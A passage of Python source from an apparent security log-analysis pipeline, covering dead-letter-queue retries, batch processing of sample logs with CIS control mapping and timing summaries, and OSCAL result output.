        Process every entry in attempt_1_queue through run_full_pipeline again.

        Success  → entry removed from queue, result collected
        Failure  → entry moved to attempt_2_queue → manual_review_queue
        Returns a summary dict.
        """
        summary = {"retried": 0, "recovered": 0, "moved_to_manual": 0, "results": []}

        with self._lock:
            to_retry = list(self.attempt_1_queue)
            self.attempt_1_queue = []
            self._save_all()

        if not to_retry:
            print("[DLQ] attempt_1_queue is empty — nothing to retry")
            return summary

        print(f"\n[DLQ] Starting retry run — {len(to_retry)} entries")
        print("=" * 72)

        for entry in to_retry:
            log_type = entry["log_type"]
            raw_log  = entry["raw_log"]
            summary["retried"] += 1

            print(f"\n  [DLQ retry] {log_type} "
                  f"(original failure: {entry['failure_stage']})")
            try:
                result = run_full_pipeline(raw_log, log_type=log_type)
            except Exception as e:
                result = {
                    "findings": {}, "investigation_query": "", "rag_results": [],
                    "_failure_stage": "retry_exception", "_parse_error": str(e),
                    "_log_type": log_type,
                }

            if not self._is_failure(result):
                # Recovered — collect result
                print(f"  [DLQ retry] ✅ RECOVERED — {log_type}")
                summary["recovered"] += 1
                summary["results"].append({
                    "log_type": log_type,
                    "result":   result,
                    "status":   "recovered",
                })
            else:
                # Still failing — move to attempt_2 then manual review
                print(f"  [DLQ retry] ❌ STILL FAILING — {log_type} "
                      f"→ moving to manual review")
                retry_entry = self._make_entry(
                    raw_log, log_type, result, attempt=2,
                    extra_note=f"Retry of: {entry['failure_stage']}"
                )
                with self._lock:
                    self.attempt_2_queue.append(retry_entry)
                    self.manual_review.append(retry_entry)
                    self._save_all()
                summary["moved_to_manual"] += 1
                summary["results"].append({
                    "log_type": log_type,
                    "result":   result,
                    "status":   "manual_review",
                })

        print(f"\n[DLQ] Retry complete")
        print(f"   Retried          : {summary['retried']}")
        print(f"   Recovered        : {summary['recovered']}")
        print(f"   Sent to manual   : {summary['moved_to_manual']}")
        print("=" * 72)
        return summary

    def status(self) -> None:
        """Print current queue depths and manual review entries."""
        print(f"\n{'=' * 72}")
        print(f"  DEAD LETTER QUEUE STATUS")
        print(f"{'=' * 72}")
        print(f"  attempt_1_queue  : {len(self.attempt_1_queue)} entries")
        print(f"  attempt_2_queue  : {len(self.attempt_2_queue)} entries")
        print(f"  manual_review    : {len(self.manual_review)} entries")
        if self.manual_review:
            print(f"\n  Manual review entries (for cybersecurity expert):")
            print(f"  {'Log Type':<22} {'Stage':<20} {'Timestamp':<30} Note")
            print(f"  {'-'*80}")
            for e in self.manual_review:
                print(f"  {e['log_type']:<22} "
                      f"{e['failure_stage']:<20} "
                      f"{e['timestamp']:<30} "
                      f"{e.get('note','')}")
        print(f"{'=' * 72}\n")

    def clear_manual_review(self) -> None:
        """
        Call this after a cybersecurity expert has reviewed the manual queue.
        Clears manual_review and attempt_2_queue from disk and memory.
        """
        with self._lock:
            cleared = len(self.manual_review)
            self.manual_review   = []
            self.attempt_2_queue = []
            self._save_all()
        print(f"[DLQ] Manual review queue cleared ({cleared} entries removed)")


# ── Instantiate the DLQ (loaded from disk if files exist) ────────────────────
dlq = DeadLetterQueue()

# Shared list — logs that failed both complete_log_pipeline_run and DLQ retry
logs_failed_in_DLQ = []


# ─────────────────────────────────────────────────────────────────────────────
# STEP 2 — complete_log_pipeline_run
# Runs all 25 sample logs through the full pipeline.
# Successes → written to timestamped .txt file
# Failures  → submitted to dlq.attempt_1_queue
# ─────────────────────────────────────────────────────────────────────────────
import sys

class _TeeWriter:
    """
    Writes to both sys.stdout (terminal) and a file simultaneously.
    Used to capture full pipeline output into the result .txt file.
    """
    def __init__(self, file):
        self._file    = file
        self._stdout  = sys.stdout
    def write(self, data):
        self._stdout.write(data)
        self._file.write(data)
    def flush(self):
        self._stdout.flush()
        self._file.flush()


def complete_log_pipeline_run() -> list:
    """
    Run every log entry loaded from LOG_INPUT_PATH through run_full_pipeline().
    Full terminal output for every log is captured into a timestamped .txt file.
    A summary block is appended at the end of the file.
    Failures are submitted to the DLQ automatically.
    Returns list of successful result dicts.
    """
    from datetime import datetime
    successful_results = []
    log_entries = load_logs_from_file(LOG_INPUT_PATH)
    ts    = datetime.now().strftime("%d%m%Y%H%M")
    fname = f"{ts}pipeline_result.txt"
    fpath = os.path.join(OUTPUT_DIR, fname)

    with open(fpath, "w", encoding="utf-8") as log_file:

        # ── Tee stdout → terminal + file for the entire run ───────────────────
        original_stdout = sys.stdout
        sys.stdout      = _TeeWriter(log_file)

        try:
            print(f"\n{'=' * 72}")
            print(f"  COMPLETE LOG PIPELINE RUN — {len(log_entries)} log entries")
            print(f"  Run timestamp : {datetime.now().isoformat()}")
            print(f"{'=' * 72}")

            for log_type, raw_log in log_entries:
                print(f"\n── [{log_type.upper()}] ──────────────────────────────────────────")
                _t_start = time.perf_counter()
                try:
                    result = run_full_pipeline(raw_log, log_type=log_type)
                    _elapsed = time.perf_counter() - _t_start

                    if result.get("_failure_stage") is not None:
                        print(f"  [complete_run] ❌ FAILED at stage: {result['_failure_stage']}  ({_elapsed:.1f}s)")
                        dlq.submit(
                            raw_log=raw_log,
                            log_type=log_type,
                            result=result,
                            note=f"complete_log_pipeline_run:stage={result['_failure_stage']}"
                        )
                    else:
                        print(f"  [complete_run] ✅ SUCCESS — {log_type}  ({_elapsed:.1f}s)")
                        # Per-phase timing breakdown is already printed once, inside
                        # run_full_pipeline() itself, as part of the consolidated
                        # compliance + runtime summary — not repeated here.
                        successful_results.append({
                            "log_type":    log_type,
                            "result":      result,
                            "elapsed_sec": round(_elapsed, 2),
                        })

                except Exception as e:
                    _elapsed = time.perf_counter() - _t_start
                    print(f"  [complete_run] ❌ EXCEPTION — {log_type}: {e}  ({_elapsed:.1f}s)")
                    failure_result = {
                        "findings": {}, "investigation_query": "", "rag_results": [],
                        "_failure_stage": "pipeline_exception",
                        "_parse_error":   str(e),
                        "_log_type":      log_type,
                    }
                    dlq.submit(
                        raw_log=raw_log,
                        log_type=log_type,
                        result=failure_result,
                        note=f"complete_log_pipeline_run:exception:{str(e)[:80]}"
                    )

            # ── Summary block — written at end of file ─────────────────────────
            print(f"\n{'=' * 72}")
            print(f"  COMPLETE LOG PIPELINE RUN RESULTS")
            print(f"{'=' * 72}")
            print(f"  Run timestamp : {datetime.now().isoformat()}")
            print(f"  Total logs    : {len(log_entries)}")
            print(f"  Successful    : {len(successful_results)}")
            print(f"  Failed (→DLQ) : {len(log_entries) - len(successful_results)}")
            if len(log_entries) - len(successful_results) > 0:
                print(f"\n  Log types with at least one failure:")
                failed_types = {lt for lt, _ in log_entries} - {e["log_type"] for e in successful_results}
                for ft in failed_types:
                    print(f"    ❌ {ft}")

            # ── Per-log timing table ──────────────────────────────────────────
            if successful_results:
                timings = [(r["log_type"], r.get("elapsed_sec", 0.0))
                           for r in successful_results]
                timings_sorted = sorted(timings, key=lambda x: x[1], reverse=True)
                total_t  = sum(t for _, t in timings)
                avg_t    = total_t / len(timings)
                fastest  = min(timings, key=lambda x: x[1])
                slowest  = max(timings, key=lambda x: x[1])

                print(f"\n  {'─' * 60}")
                print(f"  PER-LOG TIMING")
                print(f"  {'─' * 60}")
                print(f"  {'Log Type':<28} {'Time':>8}   {'Controls'}")
                print(f"  {'─' * 60}")
                for log_t, elapsed in timings_sorted:
                    # Get violation count for this log
                    r_obj = next((r for r in successful_results if r["log_type"] == log_t), {})
                    viols = len(r_obj.get("result", {}).get("policy_findings", []))
                    ctrls = r_obj.get("result", {}).get("findings", {}).get(
                        "cis_controls_mapping", {}).get("control_ids", [])
                    ctrl_str = ", ".join(ctrls) if ctrls else "none"
                    viol_str = f"  [{viols} violation{'s' if viols != 1 else ''}]" if viols else ""
                    print(f"  {log_t:<28} {elapsed:>6.1f}s   {ctrl_str[:30]}{viol_str}")

                print(f"  {'─' * 60}")
                print(f"  Fastest  : {fastest[0]:<20} {fastest[1]:.1f}s")
                print(f"  Slowest  : {slowest[0]:<20} {slowest[1]:.1f}s")
                print(f"  Average  : {avg_t:.1f}s per log")
                print(f"  Total    : {total_t:.1f}s  ({total_t/60:.1f} min)")
            print(f"{'=' * 72}\n")

            # ── Phase 4: OSCAL output — inside TeeWriter so it goes to .txt ──────
            # Unwrap result dicts: each entry is {"log_type": ..., "result": {...}}
            # write_oscal_file expects the inner result dicts directly.
            try:
                from oscal_serialiser import write_oscal_file
                _run_ts      = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
                _raw_results = [r["result"] for r in successful_results]
                oscal_path   = write_oscal_file(_raw_results, run_timestamp=_run_ts)
                print(f"✅ OSCAL Assessment Results written: {oscal_path}")
            except Exception as _oscal_e:
                print(f"⚠️  Phase 4 OSCAL serialisation failed: {_oscal_e}")
                import traceback
                traceback.print_exc()

        finally:
            # ── Always restore stdout even if something crashes ────────────────
            sys.stdout = original_stdout

    print(f"\n✅ Full pipeline output written to: {fpath}")
    print(f"   {len(successful_results)}/{len(log_entries)} log(s) succeeded")
    dlq.status()

    return successful_results


# ─────────────────────────────────────────────────────────────────────────────
# STEP 3 — DLQ retry run + STEP 4 — Malformed log injection
# Runs after complete_log_pipeline_run() finishes.
# Malformed logs are submitted directly to DLQ first.
# Then dlq.retry_all() processes everything in attempt_1_queue.
# Logs that fail again → logs_failed_in_DLQ
# Successful DLQ recoveries → written to timestamped .txt file
# ─────────────────────────────────────────────────────────────────────────────

def run_dlq_and_malformed() -> list:
    """
    1. Run dlq.retry_all() — processes anything complete_log_pipeline_run()
       submitted to attempt_1_queue (parse failures, malformed lines, etc.).
    2. Logs that fail again → logs_failed_in_DLQ.
    3. Write successful DLQ recoveries to timestamped .txt file.
    Returns logs_failed_in_DLQ list.
    """
    from datetime import datetime
    global logs_failed_in_DLQ

        # ── Step 3: Run DLQ retry — processes anything queued in Step 2 ────────────
    print(f"\n{'=' * 72}")
    print(f"  STEP 3 — DLQ Retry Run")
    print(f"{'=' * 72}")

    dlq_summary      = dlq.retry_all()
    recovered        = []
    failed_in_dlq    = []

    for entry in dlq_summary.get("results", []):
        if entry["status"] == "recovered":
            recovered.append(entry)
        else:
            # Failed in DLQ — add to logs_failed_in_DLQ
            failed_in_dlq.append({
                "log_type":      entry["log_type"],
                "failure_stage": entry["result"].get("_failure_stage", "unknown"),
                "parse_error":   entry["result"].get("_parse_error",   "unknown"),
                "note":          "Failed in both complete_log_pipeline_run and DLQ retry",
            })

    logs_failed_in_DLQ.extend(failed_in_dlq)

    # ── Write successful DLQ recoveries to timestamped .txt file ──────────────
    if recovered:
        ts    = datetime.now().strftime("%d%m%Y%H%M")
        fname = f"{ts}dlq_result.txt"
        fpath = os.path.join(OUTPUT_DIR, fname)
        with open(fpath, "w") as f:
            f.write(f"DLQ RETRY RUN RESULTS\n")
            f.write(f"Run timestamp : {datetime.now().isoformat()}\n")
            f.write(f"Total retried : {dlq_summary['retried']}\n")
            f.write(f"Recovered     : {dlq_summary['recovered']}\n")
            f.write(f"Still failed  : {dlq_summary['moved_to_manual']}\n")
            f.write("=" * 72 + "\n\n")
            for entry in recovered:
                result = entry["result"]
                f.write(f"LOG TYPE : {entry['log_type'].upper()}\n")
                f.write(f"Severity : {result.get('findings', {}).get('severity', 'N/A')}\n")
                f.write(f"Controls : {result.get('findings', {}).get('cis_controls_mapping', {}).get('control_ids', [])}\n")
                f.write(f"RAG hits : {len(result.get('rag_results', []))}\n")
                f.write(f"Query    : {result.get('investigation_query', '')[:120]}\n")
                f.write("-" * 72 + "\n\n")
        print(f"\n✅ DLQ recovery results written to: {fpath}")
        print(f"   {len(recovered)} log(s) recovered and recorded")
    else:
        print(f"\n⚠️  No DLQ recoveries to write")

    # ── Print logs_failed_in_DLQ summary ──────────────────────────────────────
    print(f"\n{'=' * 72}")
    print(f"  DLQ FINAL SUMMARY")
    print(f"{'=' * 72}")
    print(f"  Retried           : {dlq_summary['retried']}")
    print(f"  Recovered         : {dlq_summary['recovered']}")
    print(f"  Failed in DLQ     : {len(logs_failed_in_DLQ)}")
    if logs_failed_in_DLQ:
        print(f"\n  Logs requiring manual cybersecurity review:")
        print(f"  {'Log Type':<22} {'Stage':<25} Note")
        print(f"  {'-' * 70}")
        for entry in logs_failed_in_DLQ:
            print(f"  {entry['log_type']:<22} "
                  f"{entry['failure_stage']:<25} "
                  f"{entry['note']}")
    print(f"{'=' * 72}\n")

    return logs_failed_in_DLQ


# ─────────────────────────────────────────────────────────────────────────────
# EXECUTE — Run Steps 2, 3, 4 in order
# ─────────────────────────────────────────────────────────────────────────────
# GUARDED: `import pipeline` must have ZERO side effects (no batch run, no DB
# writes). The API server imports run_full_pipeline and calls it per log line;
# the file-driven batch below only runs when this module is executed directly
# (`python pipeline.py`).
if __name__ == "__main__":
    # Step 2 — Run every log entry loaded from LOG_INPUT_PATH
    pipeline_results = complete_log_pipeline_run()

    # Steps 3 + 4 — DLQ retry (runs after Step 2 completes)
    logs_failed_in_DLQ = run_dlq_and_malformed()